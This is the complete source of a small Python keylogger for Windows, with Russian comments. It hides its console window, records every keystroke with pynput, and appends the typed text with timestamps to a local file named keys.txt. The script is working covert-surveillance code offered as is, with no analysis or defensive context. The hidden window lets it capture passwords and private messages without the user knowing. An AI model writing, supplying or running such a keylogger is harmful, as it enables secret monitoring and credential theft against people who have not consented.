from pynput.keyboard import Key, Listener
from datetime import datetime
import win32api
import win32gui
import win32console

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
 
def key_pressed(key):
    k = str(key).replace("'", '')   # убираем кавычки в выводе

    if key == Key.space:
        k = ''.join(('\n', datetime.utcnow().strftime('%d %m %Y %H:%M'), '\n'))  # заменяем непонятный вывод пробела на символ переноса строки
 
    if k.find('Key.') == -1:
        with open('keys.txt', 'at') as f:
            f.write(k)                      # убираем клавиши типа контрола, бекспейсов и т.д.
 
 
def key_released(key):
    if key == Key.esc:
        return False
 
 
with Listener( 
    on_press=key_pressed,
    on_release=key_released,
) as listener:
    listener.join()
